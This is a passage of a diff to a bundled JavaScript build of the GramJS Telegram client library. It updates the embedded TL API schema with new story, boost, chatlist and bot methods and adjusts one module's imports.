+mediaAreaCoordinates#3d1ea4e x:double y:double w:double h:double rotation:double = MediaAreaCoordinates;
+mediaAreaVenue#be82db9c coordinates:MediaAreaCoordinates geo:GeoPoint title:string address:string provider:string venue_id:string venue_type:string = MediaArea;
+inputMediaAreaVenue#b282217f coordinates:MediaAreaCoordinates query_id:long result_id:string = MediaArea;
+mediaAreaGeoPoint#df8b3b22 coordinates:MediaAreaCoordinates geo:GeoPoint = MediaArea;
+mediaAreaSuggestedReaction#14455871 flags:# dark:flags.0?true flipped:flags.1?true coordinates:MediaAreaCoordinates reaction:Reaction = MediaArea;
+peerStories#9a35e999 flags:# peer:Peer max_read_id:flags.0?int stories:Vector<StoryItem> = PeerStories;
+stories.peerStories#cae68768 stories:PeerStories chats:Vector<Chat> users:Vector<User> = stories.PeerStories;
+stories.boostsStatus#e5c1aa5c flags:# my_boost:flags.2?true level:int current_level_boosts:int boosts:int next_level_boosts:flags.0?int premium_audience:flags.1?StatsPercentValue boost_url:string = stories.BoostsStatus;
+stories.canApplyBoostOk#c3173587 = stories.CanApplyBoostResult;
+stories.canApplyBoostReplace#712c4655 current_boost:Peer chats:Vector<Chat> = stories.CanApplyBoostResult;
+booster#e9e6380 user_id:long expires:int = Booster;
+stories.boostersList#f3dd3d1d flags:# count:int boosters:Vector<Booster> next_offset:flags.0?string users:Vector<User> = stories.BoostersList;
+messages.webPage#fd5e12bd webpage:WebPage chats:Vector<Chat> users:Vector<User> = messages.WebPage;
 ---functions---
 invokeAfterMsg#cb9f372d {X:Type} msg_id:long query:!X = X;
 invokeAfterMsgs#3dc4b4f0 {X:Type} msg_ids:Vector<long> query:!X = X;
@@ -56881,6 +57208,7 @@ auth.acceptLoginToken#e894ad4d token:bytes = Authorization;
 auth.checkRecoveryPassword#d36bf79 code:string = Bool;
 auth.importWebTokenAuthorization#2db873a9 api_id:int api_hash:string web_auth_token:string = auth.Authorization;
 auth.requestFirebaseSms#89464b50 flags:# phone_number:string phone_code_hash:string safety_net_token:flags.0?string ios_push_secret:flags.1?string = Bool;
+auth.resetLoginEmail#7e960193 phone_number:string phone_code_hash:string = auth.SentCode;
 account.registerDevice#ec86017a flags:# no_muted:flags.0?true token_type:int token:string app_sandbox:Bool secret:bytes other_uids:Vector<long> = Bool;
 account.unregisterDevice#6a0d3206 token_type:int token:string other_uids:Vector<long> = Bool;
 account.updateNotifySettings#84be5b93 peer:InputNotifyPeer settings:InputPeerNotifySettings = Bool;
@@ -56928,9 +57256,9 @@ account.resendPasswordEmail#7a7f2a15 = Bool;
 account.cancelPasswordEmail#c1cbd5b6 = Bool;
 account.getContactSignUpNotification#9f07c728 = Bool;
 account.setContactSignUpNotification#cff43f61 silent:Bool = Bool;
-account.getNotifyExceptions#53577479 flags:# compare_sound:flags.1?true peer:flags.0?InputNotifyPeer = Updates;
+account.getNotifyExceptions#53577479 flags:# compare_sound:flags.1?true compare_stories:flags.2?true peer:flags.0?InputNotifyPeer = Updates;
 account.getWallPaper#fc8ddbea wallpaper:InputWallPaper = WallPaper;
-account.uploadWallPaper#dd853661 file:InputFile mime_type:string settings:WallPaperSettings = WallPaper;
+account.uploadWallPaper#e39a8f03 flags:# for_chat:flags.0?true file:InputFile mime_type:string settings:WallPaperSettings = WallPaper;
 account.saveWallPaper#6c5a5b37 wallpaper:InputWallPaper unsave:Bool settings:WallPaperSettings = Bool;
 account.installWallPaper#feed5769 wallpaper:InputWallPaper settings:WallPaperSettings = Bool;
 account.resetWallPapers#bb3b9804 = Bool;
@@ -56953,7 +57281,7 @@ account.resetPassword#9308ce1b = account.ResetPasswordResult;
 account.declinePasswordReset#4c9409f6 = Bool;
 account.getChatThemes#d638de89 hash:long = account.Themes;
 account.setAuthorizationTTL#bf899aa0 authorization_ttl_days:int = Bool;
-account.changeAuthorizationSettings#40f48462 flags:# hash:long encrypted_requests_disabled:flags.0?Bool call_requests_disabled:flags.1?Bool = Bool;
+account.changeAuthorizationSettings#40f48462 flags:# confirmed:flags.3?true hash:long encrypted_requests_disabled:flags.0?Bool call_requests_disabled:flags.1?Bool = Bool;
 account.getSavedRingtones#e1902288 hash:long = account.SavedRingtones;
 account.saveRingtone#3dea5b03 id:InputDocument unsave:Bool = account.SavedRingtone;
 account.uploadRingtone#831a83a2 file:InputFile file_name:string mime_type:string = Document;
@@ -56968,6 +57296,7 @@ account.getDefaultGroupPhotoEmojis#915860ae hash:long = EmojiList;
 account.getAutoSaveSettings#adcbbcda = account.AutoSaveSettings;
 account.saveAutoSaveSettings#d69b8361 flags:# users:flags.0?true chats:flags.1?true broadcasts:flags.2?true peer:flags.3?InputPeer settings:AutoSaveSettings = Bool;
 account.deleteAutoSaveExceptions#53bc0020 = Bool;
+account.invalidateSignInCodes#ca8ae8ba codes:Vector<string> = Bool;
 users.getUsers#d91a548 id:Vector<InputUser> = Vector<User>;
 users.getFullUser#b60f5918 id:InputUser = users.UserFull;
 users.setSecureValueErrors#90c894b5 id:InputUser errors:Vector<SecureValueError> = Bool;
@@ -56977,9 +57306,9 @@ contacts.getContacts#5dd69e12 hash:long = contacts.Contacts;
 contacts.importContacts#2c800be5 contacts:Vector<InputContact> = contacts.ImportedContacts;
 contacts.deleteContacts#96a0e00 id:Vector<InputUser> = Updates;
 contacts.deleteByPhones#1013fd9e phones:Vector<string> = Bool;
-contacts.block#68cc1411 id:InputPeer = Bool;
-contacts.unblock#bea65d50 id:InputPeer = Bool;
-contacts.getBlocked#f57c350f offset:int limit:int = contacts.Blocked;
+contacts.block#2e2e8734 flags:# my_stories_from:flags.0?true id:InputPeer = Bool;
+contacts.unblock#b550d328 flags:# my_stories_from:flags.0?true id:InputPeer = Bool;
+contacts.getBlocked#9a868f80 flags:# my_stories_from:flags.0?true offset:int limit:int = contacts.Blocked;
 contacts.search#11f812d8 q:string limit:int = contacts.Found;
 contacts.resolveUsername#f93ccba3 username:string = contacts.ResolvedPeer;
 contacts.getTopPeers#973478b6 flags:# correspondents:flags.0?true bots_pm:flags.1?true bots_inline:flags.2?true phone_calls:flags.3?true forward_users:flags.4?true forward_chats:flags.5?true groups:flags.10?true channels:flags.15?true offset:int limit:int hash:long = contacts.TopPeers;
@@ -56994,6 +57323,8 @@ contacts.blockFromReplies#29a8962c flags:# delete_message:flags.0?true delete_hi
 contacts.resolvePhone#8af94344 phone:string = contacts.ResolvedPeer;
 contacts.exportContactToken#f8654027 = ExportedContactToken;
 contacts.importContactToken#13005788 token:string = User;
+contacts.editCloseFriends#ba6705f0 id:Vector<long> = Bool;
+contacts.setBlocked#94c65c76 flags:# my_stories_from:flags.0?true id:Vector<InputPeer> limit:int = Bool;
 messages.getMessages#63c66506 id:Vector<InputMessage> = messages.Messages;
 messages.getDialogs#a0f4cb4f flags:# exclude_pinned:flags.0?true folder_id:flags.1?int offset_date:int offset_id:int offset_peer:InputPeer limit:int hash:long = messages.Dialogs;
 messages.getHistory#4423e6c5 peer:InputPeer offset_id:int offset_date:int add_offset:int limit:int max_id:int min_id:int hash:long = messages.Messages;
@@ -57003,8 +57334,8 @@ messages.deleteHistory#b08f922a flags:# just_clear:flags.0?true revoke:flags.1?t
 messages.deleteMessages#e58e95d2 flags:# revoke:flags.0?true id:Vector<int> = messages.AffectedMessages;
 messages.receivedMessages#5a954c0 max_id:int = Vector<ReceivedNotifyMessage>;
 messages.setTyping#58943ee2 flags:# peer:InputPeer top_msg_id:flags.0?int action:SendMessageAction = Bool;
-messages.sendMessage#1cc20387 flags:# no_webpage:flags.1?true silent:flags.5?true background:flags.6?true clear_draft:flags.7?true noforwards:flags.14?true update_stickersets_order:flags.15?true peer:InputPeer reply_to_msg_id:flags.0?int top_msg_id:flags.9?int message:string random_id:long reply_markup:flags.2?ReplyMarkup entities:flags.3?Vector<MessageEntity> schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
-messages.sendMedia#7547c966 flags:# silent:flags.5?true background:flags.6?true clear_draft:flags.7?true noforwards:flags.14?true update_stickersets_order:flags.15?true peer:InputPeer reply_to_msg_id:flags.0?int top_msg_id:flags.9?int media:InputMedia message:string random_id:long reply_markup:flags.2?ReplyMarkup entities:flags.3?Vector<MessageEntity> schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
+messages.sendMessage#280d096f flags:# no_webpage:flags.1?true silent:flags.5?true background:flags.6?true clear_draft:flags.7?true noforwards:flags.14?true update_stickersets_order:flags.15?true peer:InputPeer reply_to:flags.0?InputReplyTo message:string random_id:long reply_markup:flags.2?ReplyMarkup entities:flags.3?Vector<MessageEntity> schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
+messages.sendMedia#72ccc23d flags:# silent:flags.5?true background:flags.6?true clear_draft:flags.7?true noforwards:flags.14?true update_stickersets_order:flags.15?true peer:InputPeer reply_to:flags.0?InputReplyTo media:InputMedia message:string random_id:long reply_markup:flags.2?ReplyMarkup entities:flags.3?Vector<MessageEntity> schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
 messages.forwardMessages#c661bbc4 flags:# silent:flags.5?true background:flags.6?true with_my_score:flags.8?true drop_author:flags.11?true drop_media_captions:flags.12?true noforwards:flags.14?true from_peer:InputPeer id:Vector<int> random_id:Vector<long> to_peer:InputPeer top_msg_id:flags.9?int schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
 messages.reportSpam#cf1592db peer:InputPeer = Bool;
 messages.getPeerSettings#efd9a6a2 peer:InputPeer = messages.PeerSettings;
@@ -57047,8 +57378,8 @@ messages.getDocumentByHash#b1f2061f sha256:bytes size:long mime_type:string = Do
 messages.getSavedGifs#5cf09635 hash:long = messages.SavedGifs;
 messages.saveGif#327a30cb id:InputDocument unsave:Bool = Bool;
 messages.getInlineBotResults#514e999d flags:# bot:InputUser peer:InputPeer geo_point:flags.0?InputGeoPoint query:string offset:string = messages.BotResults;
-messages.setInlineBotResults#eb5ea206 flags:# gallery:flags.0?true private:flags.1?true query_id:long results:Vector<InputBotInlineResult> cache_time:int next_offset:flags.2?string switch_pm:flags.3?InlineBotSwitchPM = Bool;
-messages.sendInlineBotResult#d3fbdccb flags:# silent:flags.5?true background:flags.6?true clear_draft:flags.7?true hide_via:flags.11?true peer:InputPeer reply_to_msg_id:flags.0?int top_msg_id:flags.9?int random_id:long query_id:long id:string schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
+messages.setInlineBotResults#bb12a419 flags:# gallery:flags.0?true private:flags.1?true query_id:long results:Vector<InputBotInlineResult> cache_time:int next_offset:flags.2?string switch_pm:flags.3?InlineBotSwitchPM switch_webview:flags.4?InlineBotWebView = Bool;
+messages.sendInlineBotResult#f7bc68ba flags:# silent:flags.5?true background:flags.6?true clear_draft:flags.7?true hide_via:flags.11?true peer:InputPeer reply_to:flags.0?InputReplyTo random_id:long query_id:long id:string schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
 messages.getMessageEditData#fda68d36 peer:InputPeer id:int = messages.MessageEditData;
 messages.editMessage#48f71778 flags:# no_webpage:flags.1?true peer:InputPeer id:int message:flags.11?string media:flags.14?InputMedia reply_markup:flags.2?ReplyMarkup entities:flags.3?Vector<MessageEntity> schedule_date:flags.15?int = Updates;
 messages.editInlineBotMessage#83557dba flags:# no_webpage:flags.1?true id:InputBotInlineMessageID message:flags.11?string media:flags.14?InputMedia reply_markup:flags.2?ReplyMarkup entities:flags.3?Vector<MessageEntity> = Bool;
@@ -57070,21 +57401,20 @@ messages.setInlineGameScore#15ad9f64 flags:# edit_message:flags.0?true force:fla
 messages.getGameHighScores#e822649d peer:InputPeer id:int user_id:InputUser = messages.HighScores;
 messages.getInlineGameHighScores#f635e1b id:InputBotInlineMessageID user_id:InputUser = messages.HighScores;
 messages.getCommonChats#e40ca104 user_id:InputUser max_id:long limit:int = messages.Chats;
-messages.getAllChats#875f74be except_ids:Vector<long> = messages.Chats;
-messages.getWebPage#32ca8f91 url:string hash:int = WebPage;
+messages.getWebPage#8d9692a3 url:string hash:int = messages.WebPage;
 messages.toggleDialogPin#a731e257 flags:# pinned:flags.0?true peer:InputDialogPeer = Bool;
 messages.reorderPinnedDialogs#3b1adf37 flags:# force:flags.0?true folder_id:int order:Vector<InputDialogPeer> = Bool;
 messages.getPinnedDialogs#d6b94df2 folder_id:int = messages.PeerDialogs;
 messages.setBotShippingResults#e5f672fa flags:# query_id:long error:flags.0?string shipping_options:flags.1?Vector<ShippingOption> = Bool;
 messages.setBotPrecheckoutResults#9c2dd95 flags:# success:flags.1?true query_id:long error:flags.0?string = Bool;
 messages.uploadMedia#519bc2b1 peer:InputPeer media:InputMedia = MessageMedia;
-messages.sendScreenshotNotification#c97df020 peer:InputPeer reply_to_msg_id:int random_id:long = Updates;
+messages.sendScreenshotNotification#a1405817 peer:InputPeer reply_to:InputReplyTo random_id:long = Updates;
 messages.getFavedStickers#4f1aaa9 hash:long = messages.FavedStickers;
 messages.faveSticker#b9ffc55b id:InputDocument unfave:Bool = Bool;
 messages.getUnreadMentions#f107e790 flags:# peer:InputPeer top_msg_id:flags.0?int offset_id:int add_offset:int limit:int max_id:int min_id:int = messages.Messages;
 messages.readMentions#36e5bf4d flags:# peer:InputPeer top_msg_id:flags.0?int = messages.AffectedHistory;
 messages.getRecentLocations#702a40e0 peer:InputPeer limit:int hash:long = messages.Messages;
-messages.sendMultiMedia#b6f11a1c flags:# silent:flags.5?true background:flags.6?true clear_draft:flags.7?true noforwards:flags.14?true update_stickersets_order:flags.15?true peer:InputPeer reply_to_msg_id:flags.0?int top_msg_id:flags.9?int multi_media:Vector<InputSingleMedia> schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
+messages.sendMultiMedia#456e8987 flags:# silent:flags.5?true background:flags.6?true clear_draft:flags.7?true noforwards:flags.14?true update_stickersets_order:flags.15?true peer:InputPeer reply_to:flags.0?InputReplyTo multi_media:Vector<InputSingleMedia> schedule_date:flags.10?int send_as:flags.13?InputPeer = Updates;
 messages.uploadEncryptedFile#5057c497 peer:InputEncryptedChat file:InputEncryptedFile = EncryptedFile;
 messages.searchStickerSets#35705b8a flags:# exclude_featured:flags.0?true q:string hash:long = messages.FoundStickerSets;
 messages.getSplitRanges#1cff7e08 = Vector<MessageRange>;
@@ -57136,7 +57466,7 @@ messages.getChatInviteImporters#df04dd4e flags:# requested:flags.0?true peer:Inp
 messages.setHistoryTTL#b80e5fe4 peer:InputPeer period:int = Updates;
 messages.checkHistoryImportPeer#5dc60f03 peer:InputPeer = messages.CheckedHistoryImportPeer;
 messages.setChatTheme#e63be13f peer:InputPeer emoticon:string = Updates;
-messages.getMessageReadParticipants#2c6f97b7 peer:InputPeer msg_id:int = Vector<long>;
+messages.getMessageReadParticipants#31c1c44f peer:InputPeer msg_id:int = Vector<ReadParticipantDate>;
 messages.getSearchResultsCalendar#49f0bde9 peer:InputPeer filter:MessagesFilter offset_id:int offset_date:int = messages.SearchResultsCalendar;
 messages.getSearchResultsPositions#6e9583a3 peer:InputPeer filter:MessagesFilter offset_id:int limit:int = messages.SearchResultsPositions;
 messages.hideChatJoinRequest#7fe7e815 flags:# approved:flags.0?true peer:InputPeer user_id:InputUser = Updates;
@@ -57156,9 +57486,9 @@ messages.searchSentMedia#107e31a0 q:string filter:MessagesFilter limit:int = mes
 messages.getAttachMenuBots#16fcc2cb hash:long = AttachMenuBots;
 messages.getAttachMenuBot#77216192 bot:InputUser = AttachMenuBotsBot;
 messages.toggleBotInAttachMenu#69f59d69 flags:# write_allowed:flags.0?true bot:InputUser enabled:Bool = Bool;
-messages.requestWebView#178b480b flags:# from_bot_menu:flags.4?true silent:flags.5?true peer:InputPeer bot:InputUser url:flags.1?string start_param:flags.3?string theme_params:flags.2?DataJSON platform:string reply_to_msg_id:flags.0?int top_msg_id:flags.9?int send_as:flags.13?InputPeer = WebViewResult;
-messages.prolongWebView#7ff34309 flags:# silent:flags.5?true peer:InputPeer bot:InputUser query_id:long reply_to_msg_id:flags.0?int top_msg_id:flags.9?int send_as:flags.13?InputPeer = Bool;
-messages.requestSimpleWebView#299bec8e flags:# bot:InputUser url:string theme_params:flags.0?DataJSON platform:string = SimpleWebViewResult;
+messages.requestWebView#269dc2c1 flags:# from_bot_menu:flags.4?true silent:flags.5?true peer:InputPeer bot:InputUser url:flags.1?string start_param:flags.3?string theme_params:flags.2?DataJSON platform:string reply_to:flags.0?InputReplyTo send_as:flags.13?InputPeer = WebViewResult;
+messages.prolongWebView#b0d81a83 flags:# silent:flags.5?true peer:InputPeer bot:InputUser query_id:long reply_to:flags.0?InputReplyTo send_as:flags.13?InputPeer = Bool;
+messages.requestSimpleWebView#1a46500a flags:# from_switch_webview:flags.1?true from_side_menu:flags.2?true bot:InputUser url:flags.3?string start_param:flags.4?string theme_params:flags.0?DataJSON platform:string = SimpleWebViewResult;
 messages.sendWebViewResultMessage#a4314f5 bot_query_id:string result:InputBotInlineResult = WebViewMessageSent;
 messages.sendWebViewData#dc0242c8 bot:InputUser random_id:long button_text:string data:string = Updates;
 messages.transcribeAudio#269e9a49 peer:InputPeer msg_id:int = messages.TranscribedAudio;
@@ -57179,11 +57509,14 @@ messages.getEmojiStatusGroups#2ecd56cd hash:int = messages.EmojiGroups;
 messages.getEmojiProfilePhotoGroups#21a548f3 hash:int = messages.EmojiGroups;
 messages.searchCustomEmoji#2c11c0d7 emoticon:string hash:long = EmojiList;
 messages.togglePeerTranslations#e47cb579 flags:# disabled:flags.0?true peer:InputPeer = Bool;
+messages.getBotApp#34fdc5c3 app:InputBotApp hash:long = messages.BotApp;
+messages.requestAppWebView#8c5a3b3c flags:# write_allowed:flags.0?true peer:InputPeer app:InputBotApp start_param:flags.1?string theme_params:flags.2?DataJSON platform:string = AppWebViewResult;
+messages.setChatWallPaper#8ffacae1 flags:# peer:InputPeer wallpaper:flags.0?InputWallPaper settings:flags.2?WallPaperSettings id:flags.1?int = Updates;
 updates.getState#edd4882a = updates.State;
-updates.getDifference#25939651 flags:# pts:int pts_total_limit:flags.0?int date:int qts:int = updates.Difference;
+updates.getDifference#19c2f763 flags:# pts:int pts_limit:flags.1?int pts_total_limit:flags.0?int date:int qts:int qts_limit:flags.2?int = updates.Difference;
 updates.getChannelDifference#3173d78 flags:# force:flags.0?true channel:InputChannel filter:ChannelMessagesFilter pts:int limit:int = updates.ChannelDifference;
-photos.updateProfilePhoto#1c3d5956 flags:# fallback:flags.0?true id:InputPhoto = photos.Photo;
-photos.uploadProfilePhoto#93c9a51 flags:# fallback:flags.3?true file:flags.0?InputFile video:flags.1?InputFile video_start_ts:flags.2?double video_emoji_markup:flags.4?VideoSize = photos.Photo;
+photos.updateProfilePhoto#9e82039 flags:# fallback:flags.0?true bot:flags.1?InputUser id:InputPhoto = photos.Photo;
+photos.uploadProfilePhoto#388a3b5 flags:# fallback:flags.3?true bot:flags.5?InputUser file:flags.0?InputFile video:flags.1?InputFile video_start_ts:flags.2?double video_emoji_markup:flags.4?VideoSize = photos.Photo;
 photos.deletePhotos#87cf7f2f id:Vector<InputPhoto> = Vector<long>;
 photos.getUserPhotos#91cd32a8 user_id:InputUser offset:int max_id:long limit:int = photos.Photos;
 photos.uploadContactProfilePhoto#e14c4a71 flags:# suggest:flags.3?true save:flags.4?true user_id:InputUser file:flags.0?InputFile video:flags.1?InputFile video_start_ts:flags.2?double video_emoji_markup:flags.5?VideoSize = photos.Photo;
@@ -57207,7 +57540,7 @@ help.getRecentMeUrls#3dc0f114 referer:string = help.RecentMeUrls;
 help.getTermsOfServiceUpdate#2ca51fd1 = help.TermsOfServiceUpdate;
 help.acceptTermsOfService#ee72f79a id:DataJSON = Bool;
 help.getDeepLinkInfo#3fedc75f path:string = help.DeepLinkInfo;
-help.getAppConfig#98914110 = JSONValue;
+help.getAppConfig#61e3f854 hash:int = help.AppConfig;
 help.saveAppLog#6f02f748 events:Vector<InputAppEvent> = Bool;
 help.getPassportConfig#c661ad08 hash:int = help.PassportConfig;
 help.getSupportName#d360e72c = help.SupportName;
@@ -57273,6 +57606,7 @@ channels.reorderPinnedForumTopics#2950a18f flags:# force:flags.0?true channel:In
 channels.toggleAntiSpam#68f3e4eb channel:InputChannel enabled:Bool = Updates;
 channels.reportAntiSpamFalsePositive#a850a693 channel:InputChannel msg_id:int = Bool;
 channels.toggleParticipantsHidden#6a6e7854 channel:InputChannel enabled:Bool = Updates;
+channels.clickSponsoredMessage#18afbc93 channel:InputChannel random_id:bytes = Bool;
 bots.sendCustomRequest#aa2769ed custom_method:string params:DataJSON = DataJSON;
 bots.answerWebhookJSONQuery#e6213f4d query_id:long data:DataJSON = Bool;
 bots.setBotCommands#517165a scope:BotCommandScope lang_code:string commands:Vector<BotCommand> = Bool;
@@ -57282,6 +57616,13 @@ bots.setBotMenuButton#4504d54f user_id:InputUser button:BotMenuButton = Bool;
 bots.getBotMenuButton#9c60eb28 user_id:InputUser = BotMenuButton;
 bots.setBotBroadcastDefaultAdminRights#788464e1 admin_rights:ChatAdminRights = Bool;
 bots.setBotGroupDefaultAdminRights#925ec9ea admin_rights:ChatAdminRights = Bool;
+bots.setBotInfo#10cf3123 flags:# bot:flags.2?InputUser lang_code:string name:flags.3?string about:flags.0?string description:flags.1?string = Bool;
+bots.getBotInfo#dcd914fd flags:# bot:flags.0?InputUser lang_code:string = bots.BotInfo;
+bots.reorderUsernames#9709b1c2 bot:InputUser order:Vector<string> = Bool;
+bots.toggleUsername#53ca973 bot:InputUser username:string active:Bool = Bool;
+bots.canSendMessage#1359f4e6 bot:InputUser = Bool;
+bots.allowSendMessage#f132e3ef bot:InputUser = Updates;
+bots.invokeWebViewCustomMethod#87fc5e7 bot:InputUser custom_method:string params:DataJSON = DataJSON;
 payments.getPaymentForm#37148dbb flags:# invoice:InputInvoice theme_params:flags.0?DataJSON = payments.PaymentForm;
 payments.getPaymentReceipt#2478d1cc peer:InputPeer msg_id:int = payments.PaymentReceipt;
 payments.validateRequestedInfo#b6c8f12b flags:# save:flags.0?true invoice:InputInvoice info:PaymentRequestedInfo = payments.ValidatedRequestedInfo;
@@ -57293,13 +57634,16 @@ payments.exportInvoice#f91b065 invoice_media:InputMedia = payments.ExportedInvoi
 payments.assignAppStoreTransaction#80ed747d receipt:bytes purpose:InputStorePaymentPurpose = Updates;
 payments.assignPlayMarketTransaction#dffd50d3 receipt:DataJSON purpose:InputStorePaymentPurpose = Updates;
 payments.canPurchasePremium#9fc19eb6 purpose:InputStorePaymentPurpose = Bool;
-stickers.createStickerSet#9021ab67 flags:# masks:flags.0?true animated:flags.1?true videos:flags.4?true user_id:InputUser title:string short_name:string thumb:flags.2?InputDocument stickers:Vector<InputStickerSetItem> software:flags.3?string = messages.StickerSet;
+stickers.createStickerSet#9021ab67 flags:# masks:flags.0?true animated:flags.1?true videos:flags.4?true emojis:flags.5?true text_color:flags.6?true user_id:InputUser title:string short_name:string thumb:flags.2?InputDocument stickers:Vector<InputStickerSetItem> software:flags.3?string = messages.StickerSet;
 stickers.removeStickerFromSet#f7760f51 sticker:InputDocument = messages.StickerSet;
 stickers.changeStickerPosition#ffb6d4ca sticker:InputDocument position:int = messages.StickerSet;
 stickers.addStickerToSet#8653febe stickerset:InputStickerSet sticker:InputStickerSetItem = messages.StickerSet;
-stickers.setStickerSetThumb#9a364e30 stickerset:InputStickerSet thumb:InputDocument = messages.StickerSet;
+stickers.setStickerSetThumb#a76a5392 flags:# stickerset:InputStickerSet thumb:flags.0?InputDocument thumb_document_id:flags.1?long = messages.StickerSet;
 stickers.checkShortName#284b3639 short_name:string = Bool;
 stickers.suggestShortName#4dafc503 title:string = stickers.SuggestedShortName;
+stickers.changeSticker#f5537ebc flags:# sticker:InputDocument emoji:flags.0?string mask_coords:flags.1?MaskCoords keywords:flags.2?string = messages.StickerSet;
+stickers.renameStickerSet#124b1c00 stickerset:InputStickerSet title:string = messages.StickerSet;
+stickers.deleteStickerSet#87704394 stickerset:InputStickerSet = Bool;
 phone.getCallConfig#55451fa9 = DataJSON;
 phone.requestCall#42ff96ed flags:# video:flags.0?true user_id:InputUser random_id:int g_a_hash:bytes protocol:PhoneCallProtocol = phone.PhoneCall;
 phone.acceptCall#3bd2b4a0 peer:InputPhoneCall g_b:bytes protocol:PhoneCallProtocol = phone.PhoneCall;
@@ -57337,12 +57681,49 @@ langpack.getDifference#cd984aa5 lang_pack:string lang_code:string from_version:i
 langpack.getLanguages#42c6978f lang_pack:string = Vector<LangPackLanguage>;
 langpack.getLanguage#6a596502 lang_pack:string lang_code:string = LangPackLanguage;
 folders.editPeerFolders#6847d0ab folder_peers:Vector<InputFolderPeer> = Updates;
-folders.deleteFolder#1c295881 folder_id:int = Updates;
 stats.getBroadcastStats#ab42441a flags:# dark:flags.0?true channel:InputChannel = stats.BroadcastStats;
 stats.loadAsyncGraph#621d5fa0 flags:# token:string x:flags.0?long = StatsGraph;
 stats.getMegagroupStats#dcdf8607 flags:# dark:flags.0?true channel:InputChannel = stats.MegagroupStats;
 stats.getMessagePublicForwards#5630281b channel:InputChannel msg_id:int offset_rate:int offset_peer:InputPeer offset_id:int limit:int = messages.Messages;
 stats.getMessageStats#b6e0a3f5 flags:# dark:flags.0?true channel:InputChannel msg_id:int = stats.MessageStats;
+chatlists.exportChatlistInvite#8472478e chatlist:InputChatlist title:string peers:Vector<InputPeer> = chatlists.ExportedChatlistInvite;
+chatlists.deleteExportedInvite#719c5c5e chatlist:InputChatlist slug:string = Bool;
+chatlists.editExportedInvite#653db63d flags:# chatlist:InputChatlist slug:string title:flags.1?string peers:flags.2?Vector<InputPeer> = ExportedChatlistInvite;
+chatlists.getExportedInvites#ce03da83 chatlist:InputChatlist = chatlists.ExportedInvites;
+chatlists.checkChatlistInvite#41c10fff slug:string = chatlists.ChatlistInvite;
+chatlists.joinChatlistInvite#a6b1e39a slug:string peers:Vector<InputPeer> = Updates;
+chatlists.getChatlistUpdates#89419521 chatlist:InputChatlist = chatlists.ChatlistUpdates;
+chatlists.joinChatlistUpdates#e089f8f5 chatlist:InputChatlist peers:Vector<InputPeer> = Updates;
+chatlists.hideChatlistUpdates#66e486fb chatlist:InputChatlist = Bool;
+chatlists.getLeaveChatlistSuggestions#fdbcd714 chatlist:InputChatlist = Vector<Peer>;
+chatlists.leaveChatlist#74fae13a chatlist:InputChatlist peers:Vector<InputPeer> = Updates;
+stories.canSendStory#c7dfdfdd peer:InputPeer = Bool;
+stories.sendStory#bcb73644 flags:# pinned:flags.2?true noforwards:flags.4?true peer:InputPeer media:InputMedia media_areas:flags.5?Vector<MediaArea> caption:flags.0?string entities:flags.1?Vector<MessageEntity> privacy_rules:Vector<InputPrivacyRule> random_id:long period:flags.3?int = Updates;
+stories.editStory#b583ba46 flags:# peer:InputPeer id:int media:flags.0?InputMedia media_areas:flags.3?Vector<MediaArea> caption:flags.1?string entities:flags.1?Vector<MessageEntity> privacy_rules:flags.2?Vector<InputPrivacyRule> = Updates;
+stories.deleteStories#ae59db5f peer:InputPeer id:Vector<int> = Vector<int>;
+stories.togglePinned#9a75a1ef peer:InputPeer id:Vector<int> pinned:Bool = Vector<int>;
+stories.getAllStories#eeb0d625 flags:# next:flags.1?true hidden:flags.2?true state:flags.0?string = stories.AllStories;
+stories.getPinnedStories#5821a5dc peer:InputPeer offset_id:int limit:int = stories.Stories;
+stories.getStoriesArchive#b4352016 peer:InputPeer offset_id:int limit:int = stories.Stories;
+stories.getStoriesByID#5774ca74 peer:InputPeer id:Vector<int> = stories.Stories;
+stories.toggleAllStoriesHidden#7c2557c4 hidden:Bool = Bool;
+stories.readStories#a556dac8 peer:InputPeer max_id:int = Vector<int>;
+stories.incrementStoryViews#b2028afb peer:InputPeer id:Vector<int> = Bool;
+stories.getStoryViewsList#7ed23c57 flags:# just_contacts:flags.0?true reactions_first:flags.2?true peer:InputPeer q:flags.1?string id:int offset:string limit:int = stories.StoryViewsList;
+stories.getStoriesViews#28e16cc8 peer:InputPeer id:Vector<int> = stories.StoryViews;
+stories.exportStoryLink#7b8def20 peer:InputPeer id:int = ExportedStoryLink;
+stories.report#1923fa8c peer:InputPeer id:Vector<int> reason:ReportReason message:string = Bool;
+stories.activateStealthMode#57bbd166 flags:# past:flags.0?true future:flags.1?true = Updates;
+stories.sendReaction#7fd736b2 flags:# add_to_recent:flags.0?true peer:InputPeer story_id:int reaction:Reaction = Updates;
+stories.getPeerStories#2c4ada50 peer:InputPeer = stories.PeerStories;
+stories.getAllReadPeerStories#9b5ae7f9 = Updates;
+stories.getPeerMaxIDs#535983c3 id:Vector<InputPeer> = Vector<int>;
+stories.getChatsToSend#a56a8b60 = messages.Chats;
+stories.togglePeerStoriesHidden#bd0415c4 peer:InputPeer hidden:Bool = Bool;
+stories.getBoostsStatus#4c449472 peer:InputPeer = stories.BoostsStatus;
+stories.getBoostersList#337ef980 peer:InputPeer offset:string limit:int = stories.BoostersList;
+stories.canApplyBoost#db05c1bd peer:InputPeer = stories.CanApplyBoostResult;
+stories.applyBoost#f29d7c2b peer:InputPeer = Bool;
 `;
 
 
@@ -58040,9 +58421,9 @@ Object.defineProperty(exports, "ChatGetter", ({ enumerable: true, get: function 
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.InlineResult = void 0;
 const api_1 = __webpack_require__(/*! ../api */ "./node_modules/telegram/tl/api.js");
-const __1 = __webpack_require__(/*! ../../ */ "./node_modules/telegram/index.js");
 const Helpers_1 = __webpack_require__(/*! ../../Helpers */ "./node_modules/telegram/Helpers.js");
 const inspect_1 = __webpack_require__(/*! ../../inspect */ "./node_modules/telegram/inspect.js");
+const Utils_1 = __webpack_require__(/*! ../../Utils */ "./node_modules/telegram/Utils.js");
 class InlineResult {
     constructor(client, original, queryId, entity) {
         this._ARTICLE = "article";
@@ -58104,7 +58485,12 @@ class InlineResult {
         else {
